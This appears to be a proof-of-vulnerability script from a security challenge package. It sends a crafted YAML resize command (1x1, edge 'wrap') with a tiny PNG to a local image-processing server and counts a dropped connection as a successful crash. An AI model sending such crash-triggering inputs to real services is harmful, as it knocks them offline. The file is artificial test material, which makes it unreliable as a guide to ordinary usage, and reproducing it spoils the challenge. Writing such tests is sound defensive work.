#!/usr/bin/env python3
# Copyright (c) 2026 Cromulence
import socket
import io
from PIL import Image
import yaml
import sys
import time
import os

def get_png_bytes():
    img = Image.new("RGB", (2, 2), (255, 255, 255))
    buf = io.BytesIO()
    img.save(buf, format="PNG")
    return buf.getvalue()

def get_yaml():
    doc = {
        "output": "jpg",
        "commands": [
            {
                "resize": {
                    "channels": 3,
                    "edge": "wrap",
                    "height": 1,
                    "width": 1
                }
            }
        ]
    }
    return yaml.dump(doc, default_flow_style=False)

class ServerClosedEarly(Exception):
    pass

class ConnectionRefusedRetry(Exception):
    pass

def send_to_server(yaml_str, img_bytes):
    yaml_bytes = yaml_str.encode("utf-8")
    msg = (len(yaml_bytes).to_bytes(4, "big") +
           len(img_bytes).to_bytes(4, "big") +
           yaml_bytes + img_bytes)

    host = os.getenv("SERVER", "127.0.0.1")
    port = int(os.getenv("PORT", 5000))
    print(f"Sending to {host}:{port}")

    with socket.create_connection((host, port), timeout=5) as s:
        s.sendall(msg)
        outimg = b""
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            outimg += chunk
    if not outimg:
        raise ServerClosedEarly("Server closed connection without sending any image data (likely crash or error)")
    return outimg

def run_pov():
    yaml_str = get_yaml()
    img_bytes = get_png_bytes()

    wall_start = time.perf_counter()
    cpu_start = time.process_time()

    exit_code = 0

    try:
        outimg = send_to_server(yaml_str, img_bytes)
    except ServerClosedEarly as e:
        print(f"FAIL: {e}", file=sys.stderr)
        print("FAILED SUCCESSFULLY!")
        exit_code = 0 # succeed from planned error
    except ConnectionRefusedError:
        return # let main retry (or timeout)
    except Exception as e:
        print("ERROR:", e, file=sys.stderr)
        exit_code = 201 # fail from some error
    else:
        wall_elapsed = time.perf_counter() - wall_start
        cpu_elapsed = time.process_time() - cpu_start
        print(f"Received image of ({len(outimg)} bytes) in {wall_elapsed:.6f}s wall, {cpu_elapsed:.6f}s cpu")
        exit_code = 1 # fail from no exploit

    # The POV was run, maybe successfully, maybe not. Either
    # way the run was completed so don't return to the loop
    sys.exit(exit_code)

def main():
    timeout = 30.0
    start = time.perf_counter()
    # The run_pov function will call sys.exit if the POV was run. If the
    # server refused the connection (i.e. not running yet) the run_pov
    # function returns. This main function is responsible for calling the
    # pov until the connection is accepted and the pov is run, and
    # managing the timeout in the case that the connection cannot be made.
    while time.perf_counter() - start < timeout:
        run_pov() # calls sys.exit on completion

    # if we get here, connection timed out so no good
    print("ERROR: Challenge container connection refused (timed out 30s)")
    sys.exit(201)

if __name__ == "__main__":
    main()
